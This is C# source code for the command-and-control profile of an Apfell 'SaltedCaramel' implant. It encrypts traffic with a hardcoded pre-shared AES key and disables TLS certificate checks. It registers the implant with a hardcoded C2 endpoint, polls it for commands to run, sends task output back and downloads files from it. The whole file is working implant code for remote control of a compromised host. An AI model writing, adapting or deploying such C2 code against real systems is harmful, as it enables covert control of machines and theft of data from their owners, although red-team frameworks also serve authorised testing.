using System;
using System.Linq;
using System.Text;
using Apfell.C2Profiles;
using Apfell.Crypto;
using SaltedCaramel.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Diagnostics;
using System.Security.Cryptography;
using System.IO;
using System.Net;

namespace Profiles
{
    class DefaultEncryption : Crypto
    {
        private byte[] PSK = { 0x00 };
        private byte[] uuid;

        public DefaultEncryption(string uuidString, string pskString)
        {
            PSK = Convert.FromBase64String(pskString);
            uuid = ASCIIEncoding.ASCII.GetBytes(uuidString);
        }
        override internal string Encrypt(string plaintext)
        {
            using (Aes scAes = Aes.Create())
            {
                // Use our PSK (generated in Apfell payload config) as the AES key
                scAes.Key = PSK;

                ICryptoTransform encryptor = scAes.CreateEncryptor(scAes.Key, scAes.IV);

                using (MemoryStream encryptMemStream = new MemoryStream())
                using (CryptoStream encryptCryptoStream = new CryptoStream(encryptMemStream, encryptor, CryptoStreamMode.Write))
                {
                    using (StreamWriter encryptStreamWriter = new StreamWriter(encryptCryptoStream))
                        encryptStreamWriter.Write(plaintext);
                    // We need to send uuid:iv:ciphertext:hmac
                    // Concat iv:ciphertext
                    byte[] encrypted = scAes.IV.Concat(encryptMemStream.ToArray()).ToArray();
                    HMACSHA256 sha256 = new HMACSHA256(PSK);
                    // Attach hmac to iv:ciphertext
                    byte[] hmac = sha256.ComputeHash(encrypted);
                    // Attach uuid to iv:ciphertext:hmac
                    byte[] final = uuid.Concat(encrypted.Concat(hmac).ToArray()).ToArray();
                    // Return base64 encoded ciphertext
                    return Convert.ToBase64String(final);
                }
            }
        }

        override internal string Decrypt(string encrypted)
        {
            byte[] input = Convert.FromBase64String(encrypted);

            int uuidLength = uuid.Length;
            // Input is uuid:iv:ciphertext:hmac, IV is 16 bytes
            byte[] uuidInput = new byte[uuidLength];
            Array.Copy(input, uuidInput, uuidLength);
            
            byte[] IV = new byte[16];
            Array.Copy(input, uuidLength, IV, 0, 16);

            byte[] ciphertext = new byte[input.Length - uuidLength - 16 - 32];
            Array.Copy(input, uuidLength + 16, ciphertext, 0, ciphertext.Length);

            HMACSHA256 sha256 = new HMACSHA256(PSK);
            byte[] hmac = new byte[32];
            Array.Copy(input, uuidLength + 16 + ciphertext.Length, hmac, 0, 32);

            if (Convert.ToBase64String(hmac) == Convert.ToBase64String(sha256.ComputeHash(IV.Concat(ciphertext).ToArray())))
            {
                using (Aes scAes = Aes.Create())
                {
                    // Use our PSK (generated in Apfell payload config) as the AES key
                    scAes.Key = PSK;

                    ICryptoTransform decryptor = scAes.CreateDecryptor(scAes.Key, IV);

                    using (MemoryStream decryptMemStream = new MemoryStream(ciphertext))
                    using (CryptoStream decryptCryptoStream = new CryptoStream(decryptMemStream, decryptor, CryptoStreamMode.Read))
                    using (StreamReader decryptStreamReader = new StreamReader(decryptCryptoStream))
                    {
                        string decrypted = decryptStreamReader.ReadToEnd();
                        // Return decrypted message from Apfell server
                        return decrypted;
                    }
                }
            }
            else
            {
                throw new Exception("WARNING: HMAC did not match message!");
            }
        }
    }

    class DefaultProfile : C2Profile
    {
        private static Crypto cryptor;
        private static WebClient client;
        private const string Endpoint = "https://192.168.38.192/api/v1.4/agent_message";

        // Almost certainly need to pass arguments here to deal with proxy nonsense.
        public DefaultProfile()
        {
            // Necessary to disable certificate validation
            ServicePointManager.ServerCertificateValidationCallback =
                delegate { return true; };
            client = new WebClient();
        }

        // Make a request to the Apfell endpoint and decrypt the result
        private static string Get(string message)
        {
            return cryptor.Decrypt(client.DownloadString($"{Endpoint}/{message}"));
        }

        // Encrypt and post a string to the Apfell server
        private static string Post(string message)
        {
            byte[] reqPayload = Encoding.UTF8.GetBytes(cryptor.Encrypt(message));

            return cryptor.Decrypt(Encoding.UTF8.GetString(client.UploadData(Endpoint, reqPayload)));
        }

        override public string PostResponse(SCTaskResp taskresp)
        {
            try // Try block for HTTP requests
            {
                // Encrypt json to send to server
                string json = JsonConvert.SerializeObject(taskresp);
                string result = Post(json);
                Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.id}: {result}");
                if (result.Contains("success"))
                    // If it was successful, return the result
                    return result;
                throw (new Exception($"POST Task Response {taskresp.id} Failed"));
            }
            catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
            {
                return e.Message;
            }
        }

        override public string RegisterAgent(SaltedCaramel.SCImplant agent)
        {
            cryptor = new DefaultEncryption(agent.uuid, "jttjS4WjhCZRWusOsM57ddUOT4f/CMurAFwD5sjmUhU=");
            // Get JSON string for implant
            string json = JsonConvert.SerializeObject(agent);
            Debug.WriteLine($"[+] InitializeImplant - Sending {json}");

            string result = Post(json);

            if (result.Contains("success"))
            {
                // If it was successful, initialize implant
                // Response is { "status": "success", "id": <id> }
                JObject resultJSON = (JObject)JsonConvert.DeserializeObject(result);
                return resultJSON.Value<string>("id");
            }
            else
            {
                throw (new Exception("Failed to retrieve an ID for new callback."));
            }
        }

        /// <summary>
        /// Check Apfell endpoint for new task
        /// </summary>
        /// <returns>CaramelTask with the next task to execute</returns>
        override public SCTask CheckTasking(SaltedCaramel.SCImplant agent)
        {
            string json = "{";
            json += "\"action\":\"get_tasking\",";
            json += "\"tasking_size\":1,";
            json += "}";
            SCTask task = JsonConvert.DeserializeObject<SCTask>(Get(json));
            if (task.command != "none")
                Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
            return task;
        }

        override public byte[] GetFile(string file_id, SaltedCaramel.SCImplant implant)
        {
            byte[] bytes;
            try
            {
                string payload = "{\"file_id\": \"" + file_id + "\"}";
                // Get response from server and decrypt
                string result = Post(payload);
                bytes = Convert.FromBase64String(result);
                return bytes;
            }
            catch
            {
                return null;
            }
        }
    }
}
